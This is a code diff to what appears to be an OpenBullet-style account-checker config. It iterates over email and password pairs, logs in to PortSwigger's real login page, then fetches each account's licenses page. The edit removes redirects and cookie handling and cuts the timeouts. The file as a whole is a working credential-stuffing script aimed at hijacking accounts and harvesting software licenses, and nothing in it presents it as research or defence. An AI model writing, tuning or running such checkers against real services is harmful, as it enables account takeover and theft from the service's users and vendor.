@@ -19,11 +19,11 @@ FOREACH $"<accounts>" -> VAR "account"
   SET VAR "email" $"<creds[0]>"
   SET VAR "password" $"<creds[1]>"
 
-  PRINT "Testing account 1" White
+  PRINT "About to make request" White
 
-  ## Step 1: GET login page
-  HttpRequest GET "https://login.portswigger.net/u/login" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
-    TIMEOUT 30000
+  ## Step 1: GET login page with shorter timeout
+  HttpRequest GET "https://login.portswigger.net/u/login" ReadResponseSource=True
+    TIMEOUT 10000
     -> VAR "loginPageRes"
 
   PRINT "Step 1 done" White
@@ -35,17 +35,17 @@ FOREACH $"<accounts>" -> VAR "account"
   Append $"<postData>" $"<password>" -> VAR "postData"
   Append $"<postData>" "&action=default" -> VAR "postData"
 
-  HttpRequest POST "https://login.portswigger.net/u/login" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
+  HttpRequest POST "https://login.portswigger.net/u/login" ReadResponseSource=True
     CONTENT $"<postData>"
     CONTENTTYPE "application/x-www-form-urlencoded"
-    TIMEOUT 30000
+    TIMEOUT 10000
     -> VAR "loginRes"
 
   PRINT "Step 2 done" White
 
   ## Step 3: GET licenses page
-  HttpRequest GET "https://portswigger.net/users/youraccount/licenses" AutoRedirect=True ReadResponseSource=True AppendResponseCookies=True
-    TIMEOUT 30000
+  HttpRequest GET "https://portswigger.net/users/youraccount/licenses" ReadResponseSource=True
+    TIMEOUT 10000
     -> VAR "licensesRes"
 
   PRINT "Step 3 done" White
